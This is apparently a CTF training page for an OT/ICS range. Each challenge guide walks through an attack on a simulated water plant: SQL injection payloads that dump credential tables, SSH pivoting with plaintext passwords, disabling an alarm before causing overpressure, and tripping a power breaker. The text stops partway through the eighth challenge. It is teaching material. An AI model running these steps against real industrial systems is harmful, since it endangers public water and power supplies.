@@ -1,0 +1,920 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Challenges · Sysrupt · Wired Village</title>
+<link rel="icon" href="../assets/img/wired-village-logo.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/site.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">
+      <a href="../index.html" style="display:flex;align-items:center;gap:9px;color:inherit;border-bottom:none;">
+        <img src="../assets/img/wired-village-logo.png" alt="Wired Village">
+      </a>
+    </div>
+    <nav class="navlinks">
+      <a href="../compatriot/index.html">Compatriot</a>
+      <a href="../sysrupt-v2/index.html">Sysrupt V2</a>
+      <a href="index.html" class="active">Sysrupt V1</a>
+    </nav>
+  </div>
+</header>
+
+<section class="wrap" style="padding: 36px 24px 0;">
+  <p class="crumbs"><a href="../index.html">Wired Village</a><span class="sep">/</span><a href="index.html">Sysrupt</a><span class="sep">/</span>Challenges</p>
+  <p class="eyebrow">10 challenges · 4700 pts</p>
+  <h1>Challenges</h1>
+  <p class="lead">Content on this page is reproduced from the Sysrupt Portable OT Range repository's own challenge guides, unchanged.</p>
+</section>
+
+<section class="wrap" style="padding: 24px 24px 60px;">
+<div class="docs">
+
+  <nav class="toc">
+    <div class="toc-label">On this page</div>
+    <ol>
+      <li><a href="#ch01">1 · Perimeter Breach <small>100</small></a></li>
+      <li><a href="#ch02">2 · Intelligence Gathering <small>200</small></a></li>
+      <li><a href="#ch03">3 · Pivot to OT <small>300</small></a></li>
+      <li><a href="#ch04">4 · Building Recon <small>350</small></a></li>
+      <li><a href="#ch05">5 · Deep Protocol: DNP3 <small>400</small></a></li>
+      <li><a href="#ch06">6 · Silent Overpressure <small>450</small></a></li>
+      <li><a href="#ch07">7 · Power Substation Blackout <small>500</small></a></li>
+      <li><a href="#ch08">8 · Process Manipulation <small>600</small></a></li>
+      <li><a href="#ch09">9 · Safety Assault <small>800</small></a></li>
+      <li><a href="#ch10">10 · Full Compromise <small>1000</small></a></li>
+    </ol>
+  </nav>
+
+  <div class="content">
+
+    <!-- ============================================================ CH01 -->
+    <div class="entry" id="ch01">
+      <div class="entry-head"><span class="entry-num">01</span><h2 style="margin:0;">Perimeter Breach</h2><span class="diff-tag easy">Beginner</span></div>
+      <p><b>Points:</b> 100 &nbsp; <b>Protocol:</b> HTTP</p>
+
+      <h4>The Story</h4>
+      <p>You just plugged your laptop into a corporate network at a water treatment facility. You have no credentials, no map, no idea what's inside. Your job: find a way in.</p>
+
+      <h4>What You Know</h4>
+      <ul>
+        <li>You have an Ethernet connection</li>
+        <li>Your IP is in the 10.0.1.x range</li>
+        <li>Something is running on this network</li>
+      </ul>
+
+      <h4>Step 1: Reconnaissance</h4>
+      <p>Every pentest starts with scanning. What devices are on this network? What services are running?</p>
+      <p><b>Hint:</b> Use <code>nmap</code> to scan the corporate subnet.</p>
+      <details class="reveal guide"><summary>Need help with the command?</summary><div class="reveal-body">
+        <pre>nmap -sT 10.0.1.0/24</pre>
+      </div></details>
+      <p><b>What to look for:</b> Open ports, especially web servers (port 80, 8080).</p>
+
+      <h4>Step 2: Explore the Web Application</h4>
+      <p>You found a web server. Open it in your browser.</p>
+      <p><b>What to look for:</b></p>
+      <ul>
+        <li>Is there a login page?</li>
+        <li>Check the page source (Ctrl+U) - developers sometimes leave comments</li>
+        <li>Are there any API endpoints?</li>
+      </ul>
+
+      <h4>Step 3: Find a Vulnerability</h4>
+      <p>Web applications often have flaws in how they handle user data. Try accessing resources you shouldn't be able to.</p>
+      <p><b>Hint:</b> What happens if you change numbers in the URL?</p>
+      <details class="reveal guide"><summary>Stuck?</summary><div class="reveal-body">
+        <p>Try accessing employee records by ID:</p>
+        <pre>http://&lt;ip&gt;/api/employee/1
+http://&lt;ip&gt;/api/employee/2</pre>
+        <p>This is called IDOR (Insecure Direct Object Reference).</p>
+      </div></details>
+
+      <h4>Step 4: Get Access</h4>
+      <p>You found some data. Can you use it to log in?</p>
+      <p><b>Hint:</b> Look for usernames and try common passwords.</p>
+      <details class="reveal guide"><summary>Still stuck?</summary><div class="reveal-body">
+        <p>Try common credentials: admin/admin, admin/admin123, admin/password</p>
+      </div></details>
+
+      <h4>Step 5: What Did You Find?</h4>
+      <p>Once you're in, explore everything. The admin panel contains critical information about the internal network that you'll need for every challenge that follows.</p>
+      <p><b>Write down all the IPs and services you see.</b></p>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>Network scanning reveals hidden services</li>
+        <li>Web applications often have IDOR vulnerabilities</li>
+        <li>Default/weak credentials are everywhere</li>
+        <li>One compromised system reveals the entire network map</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> The display updates automatically when you complete this challenge. No flag to submit - just hack your way in.</p>
+    </div>
+
+    <!-- ============================================================ CH02 -->
+    <div class="entry" id="ch02">
+      <div class="entry-head"><span class="entry-num">02</span><h2 style="margin:0;">Intelligence Gathering</h2><span class="diff-tag easy">Beginner</span></div>
+      <p><b>Points:</b> 200 &nbsp; <b>Protocol:</b> OPC-UA</p>
+
+      <h4>The Story</h4>
+      <p>You broke into the corporate portal and found a list of internal systems. One of them is a "data gateway" - sounds important. Time to dig deeper into what the plant is hiding.</p>
+
+      <h4>What You Know (from Challenge 1)</h4>
+      <ul>
+        <li>Admin panel showed several internal IPs</li>
+        <li>There's a DMZ network at 10.0.2.x</li>
+        <li>Something called "OPC-UA" is running somewhere</li>
+      </ul>
+
+      <h4>Step 1: Scan the DMZ</h4>
+      <p>The admin panel pointed to the DMZ network. Scan it to find what services are running.</p>
+      <p><b>Hint:</b> Scan <code>10.0.2.0/24</code> with nmap.</p>
+      <details class="reveal guide"><summary>Need the command?</summary><div class="reveal-body">
+        <pre>nmap -sT 10.0.2.0/24</pre>
+      </div></details>
+      <p><b>What you'll notice:</b> One of the IPs from the admin panel doesn't show any open ports in the default scan. Why?</p>
+
+      <h4>Step 2: The Missing Service</h4>
+      <p>Default nmap only scans the top 1000 ports. Industrial protocols use non-standard ports that get missed.</p>
+      <p><b>Hint:</b> The admin panel told you exactly which port to look for. Scan it specifically.</p>
+      <details class="reveal guide"><summary>What port?</summary><div class="reveal-body">
+        <p>OPC-UA uses port <b>4840</b>. Scan it directly:</p>
+        <pre>nmap -sT -p 4840 10.0.2.30</pre>
+      </div></details>
+
+      <h4>Step 3: Connect to OPC-UA</h4>
+      <p>OPC-UA (Open Platform Communications Unified Architecture) is an industrial data protocol. It's like a database of everything happening in the plant.</p>
+      <p><b>Hint:</b> You have a GUI tool installed. Try running <code>opcua-client</code> from the terminal.</p>
+      <details class="reveal guide"><summary>How to connect?</summary><div class="reveal-body">
+        <ol>
+          <li>Run <code>opcua-client</code> from a terminal</li>
+          <li>Enter the address: <code>opc.tcp://10.0.2.30:4840</code></li>
+          <li>Click Connect</li>
+          <li>Browse the tree on the left panel</li>
+        </ol>
+      </div></details>
+
+      <h4>Step 4: Explore the Data</h4>
+      <p>You're now connected to the plant's data gateway. Browse through everything - look for:</p>
+      <ul>
+        <li>Configuration data</li>
+        <li>Credentials</li>
+        <li>Hidden information</li>
+        <li>Maintenance records</li>
+      </ul>
+      <p><b>Hint:</b> Expand every node. Some have sub-nodes that contain the real treasure.</p>
+      <details class="reveal guide"><summary>Where to look specifically?</summary><div class="reveal-body">
+        <p>Look at these paths:</p>
+        <ul>
+          <li><code>WaterTreatmentPlant → HistorianConfig</code> - contains database credentials</li>
+          <li><code>WaterTreatmentPlant → PlantInfo → Maintenance → ServiceHistory</code> - expand entries and check the Notes field</li>
+        </ul>
+      </div></details>
+
+      <h4>Step 5: Write It Down</h4>
+      <p>You found critical information. Write down:</p>
+      <ul>
+        <li>Any credentials (server, username, password)</li>
+        <li>Any flags</li>
+        <li>Any IP addresses and ports</li>
+        <li>Network endpoints</li>
+      </ul>
+      <p><b>You'll need these for the next challenge.</b></p>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>Industrial protocols use non-standard ports - default scans miss them</li>
+        <li>OPC-UA often allows anonymous access (no authentication)</li>
+        <li>One connection can expose the entire plant's data</li>
+        <li>Always scan specific ICS ports: 502, 4840, 20000, 44818, 2404, 47808</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> Updates automatically when you connect to the OPC-UA server.</p>
+    </div>
+
+    <!-- ============================================================ CH03 -->
+    <div class="entry" id="ch03">
+      <div class="entry-head"><span class="entry-num">03</span><h2 style="margin:0;">Pivot to OT</h2><span class="diff-tag med">Intermediate</span></div>
+      <p><b>Points:</b> 300 &nbsp; <b>Protocol:</b> SQLi + SSH</p>
+
+      <h4>The Story</h4>
+      <p>You have credentials for the plant's data historian - a database that stores all process data. Historians are gold mines for attackers because they often have weak security and contain credentials for other systems. Time to exploit it and pivot deeper into the OT network.</p>
+
+      <h4>What You Know (from Challenge 2)</h4>
+      <ul>
+        <li>Historian at <code>10.0.2.10:8080</code> with credentials <code>historian / hist0ry!</code></li>
+        <li>Jump Host at <code>10.0.2.20</code> with SSH open</li>
+        <li>SCADA HMI at <code>10.0.3.10:8080</code></li>
+      </ul>
+
+      <h4>Step 1: Login to the Historian</h4>
+      <p>Open it in your browser and login with the credentials you found.</p>
+      <details class="reveal guide"><summary>How?</summary><div class="reveal-body">
+        <pre>http://10.0.2.10:8080
+Username: historian
+Password: hist0ry!</pre>
+      </div></details>
+      <p>You should see a process data dashboard with a <b>Query</b> page.</p>
+
+      <h4>Step 2: Test for SQL Injection</h4>
+      <p>The Query page has a "Filter by Source" input field. Pentesters always test input fields for injection vulnerabilities.</p>
+      <p><b>Hint:</b> What happens if you put a single quote <code>'</code> in the field?</p>
+      <details class="reveal guide"><summary>What to try?</summary><div class="reveal-body">
+        <p>Type this in the Source field:</p>
+        <pre>'</pre>
+        <p>If you get a SQL error - the input is not sanitized. It's injectable.</p>
+      </div></details>
+
+      <h4>Step 3: Extract Data with UNION SELECT</h4>
+      <p>SQL injection lets you read any table in the database. But you need to match the column count.</p>
+      <p><b>Hint:</b> Try increasing the number of columns in a UNION SELECT until it works.</p>
+      <details class="reveal guide"><summary>How many columns?</summary><div class="reveal-body">
+        <p>The table has 10 columns. Try:</p>
+        <pre>' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --</pre>
+      </div></details>
+
+      <h4>Step 4: Find Hidden Tables</h4>
+      <p>What tables exist in this database? The database schema tells you.</p>
+      <details class="reveal guide"><summary>How to list tables?</summary><div class="reveal-body">
+        <pre>zzz' UNION SELECT name,1,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE type='table' --</pre>
+        <p>Look for interesting table names like <code>credentials</code>, <code>flags</code>, <code>users</code>.</p>
+      </div></details>
+
+      <h4>Step 5: Dump the Credentials</h4>
+      <p>You found a <code>credentials</code> table. What's in it?</p>
+      <details class="reveal guide"><summary>How to dump it?</summary><div class="reveal-body">
+        <p>First find the columns:</p>
+        <pre>zzz' UNION SELECT replace(sql,char(10),' '),1,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE name='credentials' --</pre>
+        <p>Then dump the data:</p>
+        <pre>zzz' UNION SELECT service,host||':'||port,username,password,notes,1,1,1,1,1 FROM credentials --</pre>
+      </div></details>
+      <p><b>Write down every credential you find - you need them for pivoting.</b></p>
+
+      <h4>Step 6: Don't Forget the Flags Table</h4>
+      <p>There's also a <code>flags</code> table worth checking.</p>
+      <details class="reveal guide"><summary>Query?</summary><div class="reveal-body">
+        <pre>zzz' UNION SELECT id,flag,'3','4','5','6','7','8','9','10' FROM flags --</pre>
+      </div></details>
+
+      <h4>Step 7: Pivot via SSH</h4>
+      <p>You found SSH credentials. Use them to move deeper into the network.</p>
+      <p><b>Hint:</b> Start with the Jump Host, then look around - check bash history for clues about where previous users connected.</p>
+      <details class="reveal guide"><summary>SSH commands?</summary><div class="reveal-body">
+        <pre>ssh maintenance@10.0.2.20
+# password: maint2024!</pre>
+        <p>Once on the Jump Host:</p>
+        <pre>cat ~/.bash_history</pre>
+        <p>Then pivot to the next host you find in the history.</p>
+      </div></details>
+
+      <h4>Step 8: Access the SCADA HMI</h4>
+      <p>You've pivoted to the SCADA zone. The HMI is a web application - but your laptop can't reach it directly. You need an SSH tunnel.</p>
+      <p><b>Hint:</b> SSH tunnels forward a local port through a remote host.</p>
+      <details class="reveal guide"><summary>How to tunnel?</summary><div class="reveal-body">
+        <p>From your Kali terminal (not inside the jump host):</p>
+        <pre>sshpass -p 'maint2024!' ssh -f -N -L 8080:10.0.3.10:8080 maintenance@10.0.2.20</pre>
+        <p>Then open Firefox:</p>
+        <pre>http://localhost:8080</pre>
+        <p>Login with the SCADA credentials you found in the SQL dump.</p>
+      </div></details>
+      <p><b>Explore the HMI - it has multiple tabs showing different parts of the plant.</b></p>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>SQL injection can extract entire databases</li>
+        <li>Credentials stored in plaintext are common in industrial systems</li>
+        <li>SSH tunneling lets you pivot between network zones</li>
+        <li>Bash history reveals what previous users did</li>
+        <li>One compromised system leads to the next - this is how real attacks chain</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> Updates when the SCADA HMI login is detected.</p>
+    </div>
+
+    <!-- ============================================================ CH04 -->
+    <div class="entry" id="ch04">
+      <div class="entry-head"><span class="entry-num">04</span><h2 style="margin:0;">Building Recon</h2><span class="diff-tag med">Intermediate</span></div>
+      <p><b>Points:</b> 350 &nbsp; <b>Protocol:</b> BACnet/IP</p>
+
+      <h4>The Story</h4>
+      <p>Remember that device at 10.0.1.20 from your very first scan? It had no TCP ports open - but it's definitely there. Something is monitoring the building's environment. Not all industrial protocols use TCP.</p>
+
+      <h4>What You Know</h4>
+      <ul>
+        <li>10.0.1.20 is on the corporate network (same as you)</li>
+        <li>No TCP ports were found in earlier scans</li>
+        <li>OPC-UA (CH-02) showed "BuildingManagement" sensor data - temperature, humidity</li>
+      </ul>
+
+      <h4>Step 1: Think Beyond TCP</h4>
+      <p>Your earlier scans used <code>-sT</code> which only scans TCP. Many industrial protocols use <b>UDP</b> instead.</p>
+      <p><b>Hint:</b> Building automation commonly uses UDP port 47808.</p>
+      <details class="reveal guide"><summary>How to scan UDP?</summary><div class="reveal-body">
+        <pre>sudo nmap -sU -p 47808 10.0.1.20</pre>
+        <p>Note: UDP scans require <code>sudo</code>.</p>
+      </div></details>
+
+      <h4>Step 2: What is BACnet?</h4>
+      <p>BACnet (Building Automation and Control Networks) controls:</p>
+      <ul>
+        <li>HVAC (heating, ventilation, air conditioning)</li>
+        <li>Lighting</li>
+        <li>Access control (door locks)</li>
+        <li>Fire alarm systems</li>
+      </ul>
+      <p>It uses UDP port 47808 and has <b>zero authentication</b> by default.</p>
+
+      <h4>Step 3: Discover the Device</h4>
+      <p>Use the BACnet tool to find out what's running.</p>
+      <details class="reveal guide"><summary>How?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/bacnet-tool.py -t 10.0.1.20 -c scan</pre>
+      </div></details>
+
+      <h4>Step 4: Enumerate Objects</h4>
+      <p>BACnet organizes data as objects:</p>
+      <ul>
+        <li><b>AI</b> (Analog Input) - sensors like temperature, humidity</li>
+        <li><b>AV</b> (Analog Value) - configuration parameters</li>
+        <li><b>BI</b> (Binary Input) - on/off states</li>
+      </ul>
+      <p>List everything on the device.</p>
+      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/bacnet-tool.py -t 10.0.1.20 -c list</pre>
+      </div></details>
+      <p><b>Look carefully at the output.</b> Some objects have unusual instance numbers - those are worth investigating.</p>
+
+      <h4>Step 5: Dig Deeper</h4>
+      <p>A thorough pentester doesn't just read values - they check all properties of interesting objects. BACnet objects have properties like Present-Value (85), Description (28), and Object-Name (77).</p>
+      <p><b>Hint:</b> An object with an unusual instance number might have something hidden in its Description.</p>
+      <details class="reveal guide"><summary>How to read all properties?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/bacnet-tool.py -t 10.0.1.20 -c read-all --type AV --instance &lt;number&gt;</pre>
+        <p>Try different instances, especially unusual ones.</p>
+      </div></details>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>BACnet uses UDP - TCP scans miss it completely</li>
+        <li>Building management systems often sit on the corporate network, not segmented</li>
+        <li>BACnet has zero authentication - anyone can read AND write</li>
+        <li>An attacker could control HVAC, unlock doors, disable fire alarms</li>
+        <li>Always scan UDP ports when testing OT environments</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> Updates about 30 seconds after a BACnet query is detected.</p>
+    </div>
+
+    <!-- ============================================================ CH05 -->
+    <div class="entry" id="ch05">
+      <div class="entry-head"><span class="entry-num">05</span><h2 style="margin:0;">Deep Protocol: DNP3</h2><span class="diff-tag hard">Advanced</span></div>
+      <p><b>Points:</b> 400 &nbsp; <b>Protocol:</b> DNP3 (Distributed Network Protocol 3)</p>
+
+      <h4>The Story</h4>
+      <p>You've reached the SCADA zone. From the Engineering Workstation, you can see the Process network where the actual PLCs run. One of them speaks a protocol used in power grids and water systems worldwide. It's time to go deep into industrial protocol territory.</p>
+
+      <h4>What You Know</h4>
+      <ul>
+        <li>You have SSH access to the EWS (engineer@10.0.3.20)</li>
+        <li>The Process network is at 10.0.4.x</li>
+        <li>Kali can't reach 10.0.4.x directly - firewall blocks it</li>
+      </ul>
+
+      <h4>Step 1: Scan the Process Network</h4>
+      <p>You need to scan from the EWS, or set up tunnels from Kali.</p>
+      <p><b>Hint:</b> Set up a double SSH tunnel - Kali → Jump Host → EWS.</p>
+      <details class="reveal guide"><summary>Tunnel commands?</summary><div class="reveal-body">
+        <pre># Tunnel 1: Reach EWS SSH through Jump Host
+sshpass -p 'maint2024!' ssh -f -N -L 2222:10.0.3.20:22 maintenance@10.0.2.20
+
+# Now you can SSH to EWS via localhost:2222
+sshpass -p 'eng2024!' ssh -p 2222 engineer@127.0.0.1 'nmap -sT 10.0.4.0/24 2>/dev/null'</pre>
+      </div></details>
+      <p><b>What to look for:</b> Multiple PLCs on different ports. One of them is on port 20000.</p>
+
+      <h4>Step 2: Identify the Protocol</h4>
+      <p>Port 20000 isn't standard for Modbus (502) or EtherNet/IP (44818). Research what SCADA protocol uses port 20000.</p>
+      <p><b>Hint:</b> It's a protocol designed by GE for electric utilities, now used worldwide in water and power.</p>
+      <details class="reveal guide"><summary>Answer</summary><div class="reveal-body">
+        <p>DNP3 (Distributed Network Protocol 3) - commonly on port 20000. Used in the Ukraine power grid attack (2015).</p>
+      </div></details>
+
+      <h4>Step 3: Set Up a Tunnel and Connect</h4>
+      <p>Forward port 20000 through the EWS to Kali.</p>
+      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
+        <pre>sshpass -p 'eng2024!' ssh -f -N -L 20000:10.0.4.103:20000 -p 2222 engineer@127.0.0.1</pre>
+      </div></details>
+      <p>Now use the DNP3 tool to scan and read:</p>
+      <pre>python3 ~/tools/dnp3-tool.py -t 127.0.0.1 -c scan
+python3 ~/tools/dnp3-tool.py -t 127.0.0.1 -c read</pre>
+
+      <h4>Step 4: Analyze the Data</h4>
+      <p>The read command returns binary inputs, analog inputs, and <b>counters</b>. Look at the counter values carefully.</p>
+      <p><b>Hint:</b> The counter values are small numbers. Could they represent something other than counts?</p>
+      <details class="reveal guide"><summary>Another hint</summary><div class="reveal-body">
+        <p>Look at the ASCII column next to each counter value. What do the characters spell?</p>
+      </div></details>
+
+      <h4>Step 5: The CRC Challenge</h4>
+      <p>DNP3 uses CRC-16 checksums for data integrity. The counter values encode a message. To prove you understand the protocol, you need to:</p>
+      <ol>
+        <li>Decode the message from the counter ASCII values</li>
+        <li>Calculate the DNP3 CRC-16 of that message</li>
+        <li>Write the CRC value back to the outstation</li>
+      </ol>
+      <p><b>The tool does NOT calculate CRC for you - you must write your own.</b></p>
+      <details class="reveal guide"><summary>CRC-16-DNP algorithm</summary><div class="reveal-body">
+        <pre>python3 -c "
+data = b'&lt;YOUR_MESSAGE_HERE&gt;'
+crc = 0
+for byte in data:
+    crc ^= byte
+    for _ in range(8):
+        if crc & 1:
+            crc = (crc >> 1) ^ 0xA6BC
+        else:
+            crc >>= 1
+crc = (crc ^ 0xFFFF) & 0xFFFF
+print('CRC:', crc)
+"</pre>
+      </div></details>
+
+      <h4>Step 6: Send the CRC</h4>
+      <p>Use the DNP3 tool's operate command with your calculated CRC value.</p>
+      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/dnp3-tool.py -t 127.0.0.1 -c operate -v &lt;your_crc_value&gt;</pre>
+      </div></details>
+      <p>If the CRC is correct, the outstation returns the flag in its response.</p>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>SSH tunneling chains let you reach isolated networks</li>
+        <li>DNP3 is used in power grids, water systems, oil/gas pipelines</li>
+        <li>DNP3 organizes data as binary inputs, analog inputs, and counters</li>
+        <li>CRC-16 provides data integrity but NOT security</li>
+        <li>No authentication on control commands - anyone can operate equipment</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> Updates when the correct CRC value is written to the outstation.</p>
+    </div>
+
+    <!-- ============================================================ CH06 -->
+    <div class="entry" id="ch06">
+      <div class="entry-head"><span class="entry-num">06</span><h2 style="margin:0;">Silent Overpressure</h2><span class="diff-tag hard">Advanced</span></div>
+      <p><b>Points:</b> 450 &nbsp; <b>Protocol:</b> EtherNet/IP (CIP)</p>
+
+      <h4>The Story</h4>
+      <p>The water distribution system is controlled by a Rockwell/Allen-Bradley PLC. You can see it live on the SCADA HMI - the Distribution tab shows outlet pressure, pump speed, and an alarm system. Your mission: cause an overpressure without triggering the alarm. A real attacker needs to be stealthy.</p>
+
+      <h4>What You Know</h4>
+      <ul>
+        <li>From process network scans, there's a PLC at 10.0.4.104:44818</li>
+        <li>Port 44818 = EtherNet/IP (Rockwell/Allen-Bradley standard)</li>
+        <li>The SCADA HMI Distribution page shows live pressure and alarm status</li>
+        <li>The alarm will fire if pressure exceeds the threshold</li>
+      </ul>
+
+      <h4>Step 1: Open the HMI</h4>
+      <p>Make sure you have the SCADA HMI open in Firefox (from CH-03 tunnel).</p>
+      <p><b>Open the Distribution tab</b> - watch it throughout this challenge.</p>
+      <p>You see:</p>
+      <ul>
+        <li>Outlet pressure (~42 PSI, green)</li>
+        <li>Pump speed (62%)</li>
+        <li>Mode: AUTO</li>
+        <li>Alarm: ARMED - NORMAL (green)</li>
+      </ul>
+
+      <h4>Step 2: Set Up a Tunnel</h4>
+      <p>Forward port 44818 through the EWS to Kali.</p>
+      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
+        <pre>sshpass -p 'eng2024!' ssh -f -N -L 44818:10.0.4.104:44818 -p 2222 engineer@127.0.0.1</pre>
+      </div></details>
+
+      <h4>Step 3: Scan the PLC</h4>
+      <p>Discover what tags (variables) the PLC exposes.</p>
+      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/enip-tool.py -t 127.0.0.1 -c scan</pre>
+      </div></details>
+      <p><b>Study the tags carefully.</b> Which ones are writable? Which ones control the alarm? What's the threshold?</p>
+
+      <h4>Step 4: Try the Obvious Attack</h4>
+      <p>Switch to manual mode and crank the pump to 100%.</p>
+      <p><b>Watch the HMI while you do this.</b></p>
+      <details class="reveal guide"><summary>Commands?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag MODE_SELECT --value 0
+python3 ~/tools/enip-tool.py -t 127.0.0.1 -c write --tag BOOSTER_PUMP_SPEED --value 100</pre>
+      </div></details>
+      <p><b>What happens?</b> Pressure rises... passes the threshold... <b>ALARM FIRES!</b> Everything resets. You failed.</p>
+      <p>In a real system, operators would be alerted. A stealthy attacker wouldn't trip the alarm.</p>
+
+      <h4>Step 5: Think Like Stuxnet</h4>
+      <p>The Stuxnet worm disabled safety alerts BEFORE causing physical damage. The operators saw normal readings while centrifuges were being destroyed.</p>
+      <p><b>What tag controls the alarm?</b> Can you disable it BEFORE causing overpressure?</p>
+      <details class="reveal guide"><summary>Hint</summary><div class="reveal-body">
+        <p>Look at the tag list from the scan. There's a tag that enables/disables the alarm. Write to it first, THEN cause the overpressure.</p>
+      </div></details>
+
+      <h4>Step 6: The Right Order</h4>
+      <ol>
+        <li>First: disable the alarm</li>
+        <li>Then: switch to manual mode</li>
+        <li>Then: max out the pump</li>
+      </ol>
+      <p><b>Watch the HMI</b> - pressure rises past the threshold but no alarm fires. The flag appears on the Distribution page.</p>
+      <details class="reveal guide"><summary>Need the exact commands?</summary><div class="reveal-body">
+        <p>Check the solution file - but try to figure out the order yourself first.</p>
+      </div></details>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>EtherNet/IP uses named tags - readable and writable without authentication</li>
+        <li>Order of operations matters in ICS attacks</li>
+        <li>Disabling alarms before causing damage = stealth (Stuxnet technique)</li>
+        <li>The HMI shows real-time impact of your attack</li>
+        <li>Defence: tag write monitoring, alarm tamper detection</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> Updates when pressure exceeds threshold with alarm disabled. The flag also appears on the HMI Distribution page.</p>
+    </div>
+
+    <!-- ============================================================ CH07 -->
+    <div class="entry" id="ch07">
+      <div class="entry-head"><span class="entry-num">07</span><h2 style="margin:0;">Power Substation Blackout</h2><span class="diff-tag hard">Advanced</span></div>
+      <p><b>Points:</b> 500 &nbsp; <b>Protocol:</b> IEC 60870-5-104</p>
+
+      <h4>The Story</h4>
+      <p>The plant has its own power substation - breakers, feeders, and a 230V supply keeping everything running. It's controlled by a European SCADA protocol that manages power grids across the world. One command to the wrong breaker and the entire facility goes dark. Open the <b>Power</b> tab on the HMI to see the substation diagram.</p>
+
+      <h4>What You Know</h4>
+      <ul>
+        <li>From process network scans, there's a PLC at 10.0.4.105:2404</li>
+        <li>Port 2404 = IEC 60870-5-104 (European power grid SCADA)</li>
+        <li>The SCADA HMI Power page shows a single-line substation diagram</li>
+        <li>Main breaker is CLOSED (green), voltage ~230V</li>
+      </ul>
+
+      <h4>Step 1: Watch the HMI</h4>
+      <p>Open the <b>Power</b> tab on the SCADA HMI. You see:</p>
+      <ul>
+        <li>Single-line diagram with Main Breaker, Bus Tie, Feeders A &amp; B</li>
+        <li>Live voltage, current, frequency, power measurements</li>
+        <li>Everything is green and normal</li>
+      </ul>
+      <p><b>Keep this page open - you're about to cause a blackout.</b></p>
+
+      <h4>Step 2: Set Up a Tunnel</h4>
+      <p>Forward port 2404 through the EWS.</p>
+      <details class="reveal guide"><summary>Tunnel command?</summary><div class="reveal-body">
+        <pre>sshpass -p 'eng2024!' ssh -f -N -L 2404:10.0.4.105:2404 -p 2222 engineer@127.0.0.1</pre>
+      </div></details>
+
+      <h4>Step 3: Scan the Station</h4>
+      <p>IEC 104 organizes data differently from Modbus or EtherNet/IP:</p>
+      <ul>
+        <li><b>IOA</b> (Information Object Address) identifies each data point</li>
+        <li><b>M_SP_NA_1</b> = single-point status (breaker open/closed)</li>
+        <li><b>M_ME_NC_1</b> = measured value (voltage, frequency)</li>
+        <li><b>C_SC_NA_1</b> = single command (control a breaker)</li>
+      </ul>
+      <details class="reveal guide"><summary>Scan command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c scan</pre>
+      </div></details>
+      <p><b>Study the output.</b> Note which IOAs are status points and which are command points. The command points can CONTROL the breakers.</p>
+
+      <h4>Step 4: Read Measurements</h4>
+      <p>Get a detailed view of the substation state.</p>
+      <details class="reveal guide"><summary>Command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c read</pre>
+      </div></details>
+      <p>The main breaker at IOA 100 is CLOSED - it's supplying power to the entire plant.</p>
+
+      <h4>Step 5: Trip the Main Breaker</h4>
+      <p>The command IOA for the main breaker is listed in the scan output. Send a TRIP command to open it.</p>
+      <p><b>Watch the HMI Power page when you do this.</b></p>
+      <details class="reveal guide"><summary>What value to use?</summary><div class="reveal-body">
+        <p>"trip" or "off" or "open" - the tool accepts all of these.</p>
+      </div></details>
+      <details class="reveal guide"><summary>Full command?</summary><div class="reveal-body">
+        <pre>python3 ~/tools/iec104-tool.py -t 127.0.0.1 -c control --ioa &lt;command_ioa&gt; --value trip</pre>
+      </div></details>
+      <p><b>What happens on the HMI:</b> BLACKOUT flashes across the substation diagram. The main breaker turns RED (OPEN). The flag appears.</p>
+
+      <h4>What You Learned</h4>
+      <ul>
+        <li>IEC 60870-5-104 controls real power grid infrastructure</li>
+        <li>One command can blackout an entire facility</li>
+        <li>No authentication required on breaker commands</li>
+        <li>This is exactly how the Ukraine power grid was attacked in December 2015 - attackers used IEC 104 to open breakers remotely, cutting power to 230,000 people</li>
+      </ul>
+
+      <p class="note"><b>Scoreboard:</b> Updates when the breaker trip command is detected. Flag also appears on the HMI Power page.</p>
+    </div>
+
+    <!-- ============================================================ CH08 -->
+    <div class="entry" id="ch08">
+      <div class="entry-head"><span class="entry-num">08</span><h2 style="margin:0;">Process Manipulation</h2><span class="diff-tag hard">Expert</span></div>
+      <p><b>Points:</b> 600 &nbsp; <b>Protocol:</b> Modbus TCP</p>
+
+      <h4>The Story</h4>
+      <p>The heart of the water treatment plant is the chemical dosing system. A PLC controls how much chlorine gets injected into the water - too little and bacteria survive, too much and the water becomes toxic. The PLC runs a PID controller that automatically maintains safe levels. Your mission: take over the dosing process.</p>
+
+      <h4>What You Know</h4>
+      <ul>
